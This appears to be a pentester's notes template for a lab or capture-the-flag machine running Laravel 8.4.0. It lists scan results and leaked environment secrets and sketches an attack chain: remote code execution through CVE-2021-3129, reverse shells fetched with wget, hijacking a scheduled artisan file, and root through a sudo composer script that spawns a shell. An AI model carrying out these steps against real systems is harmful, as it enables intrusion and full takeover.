[[Active Notes Template]]
## Provided Credentials
---

```

```

```

```

---
## Open Ports

| Port | Service | Notes |
| ---- | ------- | ----- |
|      |         |       |

```powershell
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)


80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: W3.CSS Template
|_http-server-header: Apache/2.4.56 (Debian)


```


---
## Software Versions

```powershell
Laravel 8.4.0
```


---
## Discovered Subdomains




---
## Discovered Credentials

DB_PASSWORD=sdfquelw0kly9jgbx92
REDIS_HOST=127.0.0.1
MIX_PUSHER_APP_CLUSTER=mt1
PWD=/tmp
APP_KEY=base64:zfXJipTpbCyrZHRDpn0/NmdpHTbAl7/hCMf476EP1LU=
APP_ENV=local

| Username | Password | Notes |
| -------- | -------- | ----- |
|          |          |       |

---
## Attack Angles


PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

Port 3306 open

```powershell
www-data@debian:/var/www/html/lavita/database/factories$ cat UserFactory.php
<?php

namespace Database\Factories;

use App\Models\User;
use Illuminate\Database\Eloquent\Factories\Factory;
use Illuminate\Support\Str;

class UserFactory extends Factory
{
    /**
     * The name of the factory's corresponding model.
     *
     * @var string
     */
    protected $model = User::class;

    /**
     * Define the model's default state.
     *
     * @return array
     */
    public function definition()
    {
        return [
            'name' => $this->faker->name,
            'email' => $this->faker->unique()->safeEmail,
            'email_verified_at' => now(),
            'password' => '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', // password
            'remember_token' => Str::random(10),
        ];
    }
}
```


---
## Steps to User.txt

https://github.com/joshuavanderpoll/CVE-2021-3129?source=post_page-----12bfd272e9cf---------------------------------------

Found Laravel 8.4.0 at /password

Get RCE through CVE 2021 3129

Upload shell.sh through wget and execute to receive port 80 Reverse shell

Flag at /skunk/local.txt

---
## Steps to root.txt

pspy discovers artisan running

We can hijack artisan file as www-data

Upload pentestmonkey as artisan and receive connection as skunk 

Skunk sudo -l shows /usr/bin/composer

```powershell
echo '{"scripts":{"x":"/bin/sh"}}' >composer.json
composer run-script x
```

Only www-data has write access to composer.json so www-data echo

then back to skunk and

```
sudo /usr/bin/composer --working-dir=/var/www/html/lavita run-script x
```

cat /root/proof.txt

---

## User Flag

```

```

## Root Flag

```

```